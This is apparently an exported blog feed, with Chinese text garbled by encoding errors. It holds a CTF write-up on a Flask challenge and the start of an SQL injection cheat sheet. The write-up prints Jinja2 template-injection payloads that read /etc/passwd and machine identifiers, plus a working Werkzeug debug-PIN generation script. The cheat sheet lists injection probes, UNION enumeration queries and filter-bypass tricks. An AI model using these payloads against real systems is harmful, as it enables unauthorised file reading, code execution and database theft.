<p><a href="https://blogjpg.yanmy.top/blog/20200224/r28i0E1LN2MG.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200224/r28i0E1LN2MG.png?imageslim" alt="mark"></a></p>
<h3 id="flaskapp"><a href="#flaskapp" class="headerlink" title="flaskapp"></a>flaskapp</h3><p>åœ¨decodeäºšç›®è¾“å…¥123å‘ç°debugé¡µé¢,åˆ†æé¡µé¢,å¾—å‡ºé¡µé¢è·¯å¾„</p>
<p><a href="https://blogjpg.yanmy.top/blog/20200224/rf8WEDdNCYa4.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200224/rf8WEDdNCYa4.png?imageslim" alt="mark"></a></p>
<p>å¾—å‡ºformateæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´,é…åˆå‘ç°jinja2æ¨¡æ¿æ³¨å…¥</p>
<p>å°è¯•å»è·å–6ä¸ªå˜é‡å€¼</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username # ç”¨æˆ·å</span><br><span class="line">modname # flask.app</span><br><span class="line">getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;)) # Flask</span><br><span class="line">getattr(mod, &#39;__file__&#39;, None) # flaskç›®å½•ä¸‹çš„ä¸€ä¸ªapp.pyçš„ç»å¯¹è·¯å¾„</span><br><span class="line">uuid.getnode() # macåœ°å€åè¿›åˆ¶</span><br><span class="line">get_machine_id() # &#x2F;etc&#x2F;machine-id</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;etc&#x2F;passwd&#39;, &#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;  </span><br><span class="line">eyUgZm9yIGMgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBjLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbignL2V0Yy9wYXNzd2QnLCAncicpLnJlYWQoKSB9fXslIGVuZGlmICV9eyUgZW5kZm9yICV9</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ç»“æœ ï¼š root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_apt:x:100:65534::&#x2F;nonexistent:&#x2F;bin&#x2F;false</span><br><span class="line">flaskweb:x:1000:1000::&#x2F;home&#x2F;flaskweb:</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address&#39;, &#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line">eyUgZm9yIGMgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBjLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbignL3N5cy9jbGFzcy9uZXQvZXRoMC9hZGRyZXNzJywgJ3InKS5yZWFkKCkgfX17JSBlbmRpZiAlfXslIGVuZGZvciAlfSAg</span><br><span class="line">MACåœ°å€:02:42:ac:12:00:0a</span><br><span class="line">MACåœ°å€åè¿›åˆ¶:2485377957898</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123;c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;proc&#x2F;self&#x2F;cgroup&#39;, &#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">eyUgZm9yIGMgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBjLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbignL3Byb2Mvc2VsZi9jZ3JvdXAnLCAncicpLnJlYWQoKSB9fXslIGVuZGlmICV9eyUgZW5kZm9yICV9</span><br><span class="line"></span><br><span class="line">12:freezer:&#x2F;docker&#x2F;3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320 11:cpuset:&#x2F;docker&#x2F;3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320 10:cpu,cpuacct:&#x2F;docker&#x2F;3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320 9:devices:&#x2F;docker&#x2F;3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320 8:hugetlb:&#x2F;docker&#x2F;3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320 7:blkio:&#x2F;docker&#x2F;3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320 6:memory:&#x2F;docker&#x2F;3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320 5:pids:&#x2F;docker&#x2F;3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320 4:net_cls,net_prio:&#x2F;docker&#x2F;3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320 3:rdma:&#x2F; 2:perf_event:&#x2F;docker&#x2F;3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320 1:name&#x3D;systemd:&#x2F;docker&#x2F;3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320 0::&#x2F;system.slice&#x2F;containerd.service</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;etc&#x2F;machine-id&#39;, &#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">eyUgZm9yIGMgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBjLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbignL2V0Yy9tYWNoaW5lLWlkJywgJ3InKS5yZWFkKCkgfX17JSBlbmRpZiAlfXslIGVuZGZvciAlfQ&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">81ef01dec0f0eb6d6c0f3752b487b10e</span><br></pre></td></tr></table></figure>
<p>åˆ©ç”¨è·å–åˆ°çš„ä¿¡æ¯çˆ†ç ´pin</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">from itertools import chain</span><br><span class="line">probably_public_bits &#x3D; [</span><br><span class="line">	&#39;flaskweb&#39;,# username</span><br><span class="line">	&#39;flask.app&#39;,# modname</span><br><span class="line">	&#39;Flask&#39;,# getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))</span><br><span class="line">	&#39;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.7&#x2F;site-packages&#x2F;flask&#x2F;app.py&#39; # getattr(mod, &#39;__file__&#39;, None),</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits &#x3D; [</span><br><span class="line">	&#39;2485377957898&#39;,# str(uuid.getnode()),  &#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address</span><br><span class="line">	&#39;3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320&#39;</span><br><span class="line">    # get_machine_id(), &#x2F;etc&#x2F;machine-id</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h &#x3D; hashlib.md5()</span><br><span class="line">for bit in chain(probably_public_bits, private_bits):</span><br><span class="line">	if not bit:</span><br><span class="line">		continue</span><br><span class="line">	if isinstance(bit, str):</span><br><span class="line">		bit &#x3D; bit.encode(&#39;utf-8&#39;)</span><br><span class="line">	h.update(bit)</span><br><span class="line">h.update(b&#39;cookiesalt&#39;)</span><br><span class="line"></span><br><span class="line">cookie_name &#x3D; &#39;__wzd&#39; + h.hexdigest()[:20]</span><br><span class="line"></span><br><span class="line">num &#x3D; None</span><br><span class="line">if num is None:</span><br><span class="line">	h.update(b&#39;pinsalt&#39;)</span><br><span class="line">	num &#x3D; (&#39;%09d&#39; % int(h.hexdigest(), 16))[:9]</span><br><span class="line"></span><br><span class="line">rv &#x3D;None</span><br><span class="line">if rv is None:</span><br><span class="line">	for group_size in 5, 4, 3:</span><br><span class="line">		if len(num) % group_size &#x3D;&#x3D; 0:</span><br><span class="line">			rv &#x3D; &#39;-&#39;.join(num[x:x + group_size].rjust(group_size, &#39;0&#39;)</span><br><span class="line">						  for x in range(0, len(num), group_size))</span><br><span class="line">			break</span><br><span class="line">	else:</span><br><span class="line">		rv &#x3D; num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br></pre></td></tr></table></figure>
<ul>
<li>åˆ©ç”¨pinç è¿›å…¥debugç•Œé¢</li>
<li>è¯»å–flag</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line">os.listdir(&#39;&#x2F;&#39;)</span><br><span class="line">open(&#39;this_is_the_flag.txt&#39;,&#39;r&#39;).read()</span><br></pre></td></tr></table></figure>
<p><a href="https://blogjpg.yanmy.top/blog/20200224/cHRqseYnAQrj.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200224/cHRqseYnAQrj.png?imageslim" alt="mark"></a></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>WP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlæ³¨å…¥æ€»ç»“</title>
    <url>/2020/02/11/CTF/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="sqlæ³¨å…¥æ€»ç»“"><a href="#sqlæ³¨å…¥æ€»ç»“" class="headerlink" title="sqlæ³¨å…¥æ€»ç»“"></a>sqlæ³¨å…¥æ€»ç»“</h1><h2 id="0x00å‰è¨€"><a href="#0x00å‰è¨€" class="headerlink" title="0x00å‰è¨€"></a>0x00å‰è¨€</h2><hr>
<p>SQLæ³¨å…¥æœ€ä¸»è¦çš„æ˜¯åˆ¤æ–­æ³¨å…¥ç›®æ ‡çš„SQLè¯­å¥å’Œå­—ç¬¦å¤„ç†è¿‡ç¨‹,æ ¹æ®åˆ¤æ–­ç»“æœé€‰æ‹©åˆé€‚çš„æ³¨å…¥æ–¹æ³•å’ŒæŠ€å·§è¿›è¡Œè„±åº“</p>
<a id="more"></a>

<p>å¸¸è§SQLæ³¨å…¥ç±»å‹æœ‰:</p>
<ul>
<li>æŒ‰å˜é‡ç±»å‹<ul>
<li>å­—ç¬¦å‹</li>
<li>æ•°å­—å‹</li>
</ul>
</li>
<li>æŒ‰HTTPæäº¤æ–¹å¼<ul>
<li>GET</li>
<li>POST</li>
<li>Cookies</li>
<li>headä¸­<ul>
<li>User-Agent</li>
<li>Referer</li>
</ul>
</li>
</ul>
</li>
<li>æŒ‰ä»æœåŠ¡å™¨æ¥æ”¶åˆ°çš„å“åº”<ul>
<li>æ˜¾é”™æ³¨å…¥(æ²¡æœ‰å…³é—­é”™è¯¯æ˜¾ç¤º,ä¼šæ˜¾ç¤ºmysql error)</li>
<li>ç›²æ³¨(åªä¼šå‘Šè¯‰ä½ sqlè¯­å¥çš„æ‰§è¡Œç»“æœtrue or false,ä¸ä¼šå°†sqlè¯­å¥æ‰§è¡Œç»“æœå±•ç¤ºç»™ä½ )<ul>
<li>åŸºäºæ—¶é—´</li>
<li>åŸºäºbool</li>
<li>åŸºäºæŠ¥é”™</li>
</ul>
</li>
<li>å †å æŸ¥è¯¢æ³¨å…¥</li>
</ul>
</li>
<li>åŸºäºç¨‹åº¦å’Œé¡ºåºçš„æ³¨å…¥<ul>
<li>ä¸€é˜¶æ³¨å…¥</li>
<li>äºŒé˜¶æ³¨å…¥</li>
</ul>
</li>
</ul>
<h2 id="0x01å¸¸ç”¨è¯­å¥"><a href="#0x01å¸¸ç”¨è¯­å¥" class="headerlink" title="0x01å¸¸ç”¨è¯­å¥"></a>0x01å¸¸ç”¨è¯­å¥</h2><h3 id="ç”¨äºå°è¯•"><a href="#ç”¨äºå°è¯•" class="headerlink" title="ç”¨äºå°è¯•"></a>ç”¨äºå°è¯•</h3><p>Ps:â€“+å¯ä»¥ç”¨#æ›¿æ¢ï¼Œurl æäº¤è¿‡ç¨‹ä¸­ url ç¼–ç åçš„#ä¸º%23</p>
<ul>
<li>or 1=1â€“+</li>
<li>â€˜ or 1=1â€“+</li>
<li>â€œ or 1=1â€“+</li>
<li>) or 1=1â€“+</li>
<li>â€˜)or 1=1â€“+</li>
<li>â€œ) or 1=1â€“+</li>
<li>â€œ))or 1=1â€“+</li>
</ul>
<p>æ€»çš„æ¥è¯´,æ€è·¯ä¸ºé—­åˆå‰é¢æœ¬æ¥sqlè¯­å¥ä¸­çš„ç¬¦å·,æ³¨é‡Šæ‰åé¢çš„ç¬¦å·</p>
<h3 id="ç”¨äºæŸ¥è¯¢"><a href="#ç”¨äºæŸ¥è¯¢" class="headerlink" title="ç”¨äºæŸ¥è¯¢"></a>ç”¨äºæŸ¥è¯¢</h3><ul>
<li>ï¼ˆ1ï¼‰è·å–å­—æ®µæ•°</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">order by n  &#x2F;*é€šè¿‡ä¸æ–­å°è¯•æ”¹å˜nçš„å€¼æ¥è§‚å¯Ÿé¡µé¢ååº”ç¡®å®šå­—æ®µæ•°*&#x2F;</span><br></pre></td></tr></table></figure>
<ul>
<li>ï¼ˆ2ï¼‰ è·å–ç³»ç»Ÿä¸­æ‰€æœ‰æ•°æ®åº“å</li>
</ul>
<p>åœ¨MySQL &gt;5.0ä¸­ï¼Œæ•°æ®åº“åå­˜æ”¾åœ¨information_schemaæ•°æ®åº“ä¸‹schemataè¡¨schema_nameå­—æ®µä¸­</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select null,null,group_concat(schema_name) from information_schema.schemata</span><br></pre></td></tr></table></figure>
<ul>
<li>ï¼ˆ3ï¼‰è·å–å½“å‰æ•°æ®åº“å</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select null,null,...,database()</span><br></pre></td></tr></table></figure>
<ul>
<li>ï¼ˆ4ï¼‰è·å–æ•°æ®åº“ä¸­çš„è¡¨</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select null,null,...,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()</span><br></pre></td></tr></table></figure>
<p>æˆ–</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select null,null,...,table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1</span><br></pre></td></tr></table></figure>
<ul>
<li>ï¼ˆ5ï¼‰è·å–è¡¨ä¸­çš„å­—æ®µ</li>
</ul>
<p>è¿™é‡Œå‡è®¾å·²ç»è·å–åˆ°è¡¨åä¸ºuser</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select null,null,...,group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;users&#39;</span><br></pre></td></tr></table></figure>
<ul>
<li>ï¼ˆ6ï¼‰è·å–å„ä¸ªå­—æ®µå€¼</li>
</ul>
<p>è¿™é‡Œå‡è®¾å·²ç»è·å–åˆ°è¡¨åä¸ºuserï¼Œä¸”å­—æ®µä¸ºusernameå’Œpassword</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select null,group_concat(username,password) from users</span><br></pre></td></tr></table></figure>
<h2 id="0x02æ³¨å…¥ç±»å‹"><a href="#0x02æ³¨å…¥ç±»å‹" class="headerlink" title="0x02æ³¨å…¥ç±»å‹"></a>0x02æ³¨å…¥ç±»å‹</h2><h3 id="æŒ‰å˜é‡ç±»å‹"><a href="#æŒ‰å˜é‡ç±»å‹" class="headerlink" title="æŒ‰å˜é‡ç±»å‹"></a>æŒ‰å˜é‡ç±»å‹</h3><h4 id="æ•°å­—å‹"><a href="#æ•°å­—å‹" class="headerlink" title="æ•°å­—å‹"></a>æ•°å­—å‹</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;1 union select database()</span><br></pre></td></tr></table></figure>
<h4 id="å­—ç¬¦å‹"><a href="#å­—ç¬¦å‹" class="headerlink" title="å­—ç¬¦å‹"></a>å­—ç¬¦å‹</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;1&#39; union select database()</span><br><span class="line">id&#x3D;1&quot; union select database()</span><br><span class="line">id&#x3D;1&#39;) union select database()</span><br><span class="line">id&#x3D;1&quot;) union select database()</span><br></pre></td></tr></table></figure>
<h3 id="æŒ‰HTTPæäº¤æ–¹å¼"><a href="#æŒ‰HTTPæäº¤æ–¹å¼" class="headerlink" title="æŒ‰HTTPæäº¤æ–¹å¼"></a>æŒ‰HTTPæäº¤æ–¹å¼</h3><h4 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h4><p>å‚è€ƒä¸Šæ–¹æŒ‰å˜é‡ç±»å‹</p>
<h4 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h4><p>ä¸€èˆ¬ä¸ºç™»å½•æ¡†,ç•™è¨€æ¿ç­‰ç­‰,ä»¥è¡¨å•å½¢å¼æäº¤çš„å­—æ®µ</p>
<h5 id="åç«¯æ— æ•°æ®å¤„ç†å‹"><a href="#åç«¯æ— æ•°æ®å¤„ç†å‹" class="headerlink" title="åç«¯æ— æ•°æ®å¤„ç†å‹"></a>åç«¯æ— æ•°æ®å¤„ç†å‹</h5><p>æ— æ•°æ®å¤„ç†,æ—¢sqlè¯­å¥å’Œå˜é‡ç›´æ¥æ‹¼æ¥,å½¢å¼å‚è€ƒGET,#ä¸éœ€è¦urlç¼–ç </p>
<h5 id="åç«¯æœ‰æ•°æ®å¤„ç†å‹"><a href="#åç«¯æœ‰æ•°æ®å¤„ç†å‹" class="headerlink" title="åç«¯æœ‰æ•°æ®å¤„ç†å‹"></a>åç«¯æœ‰æ•°æ®å¤„ç†å‹</h5><h6 id="å¸¸è§æ•°æ®å¤„ç†"><a href="#å¸¸è§æ•°æ®å¤„ç†" class="headerlink" title="å¸¸è§æ•°æ®å¤„ç†"></a>å¸¸è§æ•°æ®å¤„ç†</h6><ul>
<li>æ•°æ®å¤„ç†å‡½æ•°</li>
</ul>
<p><strong>preg_replace()</strong></p>
<p>å½“ä»£ç ä¸º<code>preg_replace(&#39;/or/i&#39;,&quot;&quot;, $id)</code>æ—¶,å¯ä»¥åˆ©ç”¨åŒå†™è¿‡æ»¤å­—ç¬¦,å› ä¸ºæ›¿æ¢ä¸ºç©º,è€Œä¸”åªæ£€æµ‹ä¸€æ¬¡</p>
<p>ä¾‹å¦‚ç»•è¿‡ä¸Šè¿°åªéœ€å°†<code>or</code>å†™å‡º<code>oorr</code>å³å¯,æ›¿æ¢æ‰ä¸­é—´çš„<code>or</code>ä¹‹å,å‰©ä¸‹çš„å­—æ®µå°±å˜æˆäº†<code>or</code></p>
<p>å¦‚æœåŒ¹é…ä¸­æ²¡æœ‰ç»Ÿè®¡å¤§å°å†™,è¿˜å¯ä»¥åˆ©ç”¨å˜æ¢è¯­å¥ä¸­å­—æ¯çš„å¤§å°å†™è¿›è¡Œç»•è¿‡</p>
<p><strong>addslashes()</strong></p>
<ul>
<li>å­—ç¬¦ç¼–ç é—®é¢˜å¯¼è‡´ç»•è¿‡<ul>
<li>è®¾ç½®æ•°æ®åº“å­—ç¬¦ä¸ºgbkå¯¼è‡´å®½å­—èŠ‚æ³¨å…¥</li>
<li>ä½¿ç”¨icon,mb_convert_encodingè½¬æ¢å­—ç¬¦ç¼–ç å‡½æ•°å¯¼è‡´å®½å­—èŠ‚æ³¨å…¥</li>
</ul>
</li>
<li>ç¼–ç è§£ç å¯¼è‡´çš„ç»•è¿‡<ul>
<li>urlè§£ç å¯¼è‡´ç»•è¿‡addslashes</li>
<li>base64è§£ç å¯¼è‡´ç»•è¿‡addslashes</li>
<li>jsonç¼–ç å¯¼è‡´ç»•è¿‡addslashes</li>
</ul>
</li>
<li>ä¸€äº›ç‰¹æ®Šæƒ…å†µå¯¼è‡´çš„ç»•è¿‡<ul>
<li>æ²¡æœ‰ä½¿ç”¨å¼•å·ä¿æŠ¤å­—ç¬¦ä¸²ï¼Œç›´æ¥æ— è§†addslashes</li>
<li>ä½¿ç”¨äº†stripslashes</li>
<li>å­—ç¬¦æ›¿æ¢å¯¼è‡´çš„ç»•è¿‡addslashes</li>
</ul>
</li>
</ul>
<hr>
<h6 id="å®½å­—èŠ‚æ³¨å…¥"><a href="#å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥"></a>å®½å­—èŠ‚æ³¨å…¥</h6><p>1ã€%df åƒæ‰ \ å…·ä½“çš„åŸå› æ˜¯ urlencode(â€˜) = %5c%27ï¼Œæˆ‘ä»¬åœ¨%5c%27 å‰é¢æ·»åŠ %dfï¼Œå½¢æˆ%df%5c%27ï¼Œ mysql åœ¨ GBK ç¼–ç æ–¹å¼çš„æ—¶å€™ä¼šå°†ä¸¤ä¸ªå­—èŠ‚å½“åšä¸€ä¸ªæ±‰å­—ï¼Œ æ­¤æ—¶%df%5c å°±æ˜¯ä¸€ä¸ªæ±‰å­—ï¼Œ %27 åˆ™ä½œä¸ºä¸€ä¸ªå•ç‹¬çš„ç¬¦å·åœ¨å¤–é¢ï¼Œ è¿™æ ·å°±è¾¾åˆ°äº†æˆ‘ä»¬çš„ç›®çš„ã€‚<br>2ã€å°† \â€™ ä¸­çš„ \ è¿‡æ»¤æ‰ï¼Œ ä¾‹å¦‚å¯ä»¥æ„é€  %**%5c%5c%27 çš„æƒ…å†µï¼Œ åé¢çš„%5c ä¼šè¢«å‰é¢çš„%5cç»™æ³¨é‡Šæ‰ã€‚è¿™ä¹Ÿæ˜¯ bypass çš„ä¸€ç§æ–¹æ³•</p>
<p>3ã€å°†utf-8çš„ â€˜ è½¬æ¢ä¸º ï¿½â€™</p>
<p>ï¿½â€™or 1=1 limit 1,1#</p>
<p>è¿˜æœ‰å¾ˆå¤šç»•è¿‡<strong>å¼•å·</strong>ã€<strong>åŒå¼•å·</strong>ã€<strong>é€—å·</strong>ã€<strong>ç©ºæ ¼</strong>çš„æ–¹æ³•</p>
<h4 id="Cookies"><a href="#Cookies" class="headerlink" title="Cookies"></a>Cookies</h4><p>å½“phpä¼šé€šè¿‡cookiesä¸­usernameç­‰å­—æ®µè¿›è¡ŒæŸ¥è¯¢æ—¶å¯èƒ½å­˜åœ¨æ³¨å…¥,ä¸POSTåŸºæœ¬ä¸€è‡´,åªæ˜¯æ³¨å…¥ä½ç½®çš„åŒºåˆ«</p>
<h5 id="headä¸­"><a href="#headä¸­" class="headerlink" title="headä¸­"></a>headä¸­</h5><ul>
<li><p>User-Agent</p>
</li>
<li><p>Referer</p>
</li>
<li><p>XFF(X-Forward-For)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">X-Forward-Forï¼š127.0.0.1&#39; select 1,2,user()</span><br></pre></td></tr></table></figure>
<p>å½“phpä¼šå°†ip,User-Agent,refererç­‰è¯·æ±‚å¤´ä¿¡æ¯è¿›è¡Œå­˜å‚¨æ•°æ®åº“æ—¶,å¯èƒ½å­˜åœ¨æ³¨å…¥,ä¸POSTåŸºæœ¬ä¸€è‡´,åªæ˜¯æ³¨å…¥ä½ç½®çš„åŒºåˆ«,å¯ä»¥é€šè¿‡æµè§ˆå™¨æ’ä»¶ã€æµè§ˆå™¨ç¼–è¾‘å’Œé‡å‘çš„åŠŸèƒ½ã€æŠ“åŒ…ç­‰å¯¹è¯·æ±‚å¤´è¿›è¡Œæ›´æ”¹</p>
</li>
</ul>
<h3 id="æŒ‰ä»æœåŠ¡å™¨æ¥æ”¶åˆ°çš„å“åº”"><a href="#æŒ‰ä»æœåŠ¡å™¨æ¥æ”¶åˆ°çš„å“åº”" class="headerlink" title="æŒ‰ä»æœåŠ¡å™¨æ¥æ”¶åˆ°çš„å“åº”"></a>æŒ‰ä»æœåŠ¡å™¨æ¥æ”¶åˆ°çš„å“åº”</h3><h4 id="æ˜¾é”™æ³¨å…¥"><a href="#æ˜¾é”™æ³¨å…¥" class="headerlink" title="æ˜¾é”™æ³¨å…¥"></a>æ˜¾é”™æ³¨å…¥</h4><p>ç”±äºphpä»£ç ä¼šå°†mysqlä¸­çš„é”™è¯¯å±•ç¤ºåœ¨å‰ç«¯ï¼Œæ‰€ä»¥å¾ˆå¥½åˆ¤æ–­ï¼Œå‚è€ƒä¸Šæ–¹GETç­‰</p>
<h4 id="ç›²æ³¨"><a href="#ç›²æ³¨" class="headerlink" title="ç›²æ³¨"></a>ç›²æ³¨</h4><h5 id="åŸºäºbool"><a href="#åŸºäºbool" class="headerlink" title="åŸºäºbool"></a>åŸºäºbool</h5><ul>
<li><p>â–²left(database(),1)&gt;â€™sâ€™ //left()å‡½æ•°</p>
<p>Explain:</p>
<ul>
<li>database()æ˜¾ç¤ºæ•°æ®åº“åç§°</li>
<li>left(a,b)ä»å·¦ä¾§æˆªå– a çš„å‰ b ä½</li>
</ul>
</li>
<li><p>â–²ascii(substr((select table_name information_schema.tables where tables_schema</p>
<p>=database()limit 0,1),1,1))=101 â€“+ //substr()å‡½æ•°ï¼Œascii()å‡½æ•°</p>
<p>Explainï¼š</p>
<ul>
<li><p>substr(a,b,c)ä» b ä½ç½®å¼€å§‹ï¼Œæˆªå–å­—ç¬¦ä¸² a çš„ c é•¿åº¦ã€‚</p>
</li>
<li><p>ascii()å°†æŸä¸ªå­—ç¬¦è½¬æ¢ä¸º ascii å€¼</p>
</li>
<li><p>ascii(substr((select database()),1,1))=98ï¼ˆæ”¹å˜ç¬¬ä¸€ä¸ª</p>
<p>1</p>
<p>å’Œ98çš„å€¼ç›¸å½“äºå°†åå­—ä¸€ä¸ªä¸ªå’Œå­—æ¯æ¯”è¾ƒï¼Œä»è€Œå¾—åˆ°å®Œæ•´åå­—ï¼‰</p>
<ul>
<li>ä¹Ÿå¯ä»¥ç”¨äºŒåˆ†æ³•å’Œ&gt;=â€™aâ€™,between andç­‰æ¥åˆ¤æ–­</li>
</ul>
</li>
</ul>
</li>
<li><p>â–²ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER</p>
<p>BY id LIMIT 0,1),1,1))&gt;98%23 //ORD()å‡½æ•°ï¼ŒMID()å‡½æ•°</p>
<p>Explainï¼š</p>
<ul>
